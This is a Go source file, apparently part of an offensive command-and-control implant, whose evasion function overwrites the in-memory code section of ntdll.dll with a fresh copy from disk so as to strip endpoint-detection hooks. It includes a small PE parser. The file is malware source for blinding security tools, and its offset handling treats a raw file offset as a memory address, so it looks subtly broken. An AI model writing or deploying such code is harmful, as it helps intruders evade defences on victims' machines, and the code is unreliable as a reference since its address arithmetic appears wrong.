//go:build windows

package evasion

import (
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// UnhookNTDLL remaps a fresh copy of ntdll.dll from disk, removing EDR hooks.
func UnhookNTDLL() error {
	sysDir, err := windows.GetSystemDirectory()
	if err != nil {
		return fmt.Errorf("GetSystemDirectory: %w", err)
	}
	fileData, err := os.ReadFile(sysDir + `\ntdll.dll`)
	if err != nil {
		return fmt.Errorf("ReadFile(ntdll): %w", err)
	}

	ntdllName, _ := windows.UTF16PtrFromString("ntdll.dll")
	hMod, _, e2 := winsyscall.ProcGetModuleHandleW.Call(uintptr(unsafe.Pointer(ntdllName)))
	if hMod == 0 {
		return fmt.Errorf("GetModuleHandle(ntdll): %v", e2)
	}

	textRVA, textSz, err := peTextSection(fileData)
	if err != nil {
		return fmt.Errorf("peTextSection: %w", err)
	}

	dst := hMod + uintptr(textRVA)
	src := fileData[textRVA : textRVA+textSz]

	var oldProtect uint32
	r, _, e := winsyscall.ProcVirtualProtect.Call(
		dst, uintptr(textSz),
		uintptr(winsyscall.PageExecuteReadWrite), uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r == 0 {
		return fmt.Errorf("VirtualProtect(RWX): %v", e)
	}

	dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(dst)), textSz)
	copy(dstSlice, src)

	winsyscall.ProcVirtualProtect.Call(dst, uintptr(textSz), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	return nil
}

// ─── Minimal PE types for .text section lookup ───────────────────────────────

const (
	peDosSignature uint16 = 0x5A4D
	peNtSignature  uint32 = 0x00004550
	peScnCntCode   uint32 = 0x00000020
)

type peDosHeader struct {
	eMagic    uint16
	_         [28]byte
	eLfanew   uint32
}

type peFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type peOptHeader64 struct {
	Magic                       uint16
	_                           [106]byte
	NumberOfRvaAndSizes         uint32
}

type peNtHeaders64 struct {
	Signature  uint32
	FileHeader peFileHeader
	Optional   peOptHeader64
}

type peSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	_                    [16]byte
	Characteristics      uint32
}

func peTextSection(pe []byte) (uint32, uint32, error) {
	if len(pe) < 64 {
		return 0, 0, fmt.Errorf("PE too small")
	}
	dos := (*peDosHeader)(unsafe.Pointer(&pe[0]))
	if dos.eMagic != peDosSignature {
		return 0, 0, fmt.Errorf("invalid DOS signature")
	}
	nt := (*peNtHeaders64)(unsafe.Pointer(&pe[dos.eLfanew]))
	if nt.Signature != peNtSignature {
		return 0, 0, fmt.Errorf("invalid NT signature")
	}

	numSec := nt.FileHeader.NumberOfSections
	firstSec := uintptr(dos.eLfanew) + 4 +
		unsafe.Sizeof(peFileHeader{}) +
		uintptr(nt.FileHeader.SizeOfOptionalHeader)

	for i := uint16(0); i < numSec; i++ {
		sec := (*peSectionHeader)(unsafe.Pointer(&pe[firstSec+uintptr(i)*unsafe.Sizeof(peSectionHeader{})]))
		if sec.Characteristics&peScnCntCode != 0 && sec.SizeOfRawData > 0 {
			return sec.PointerToRawData, sec.SizeOfRawData, nil
		}
	}
	return 0, 0, fmt.Errorf("no code section found")
}
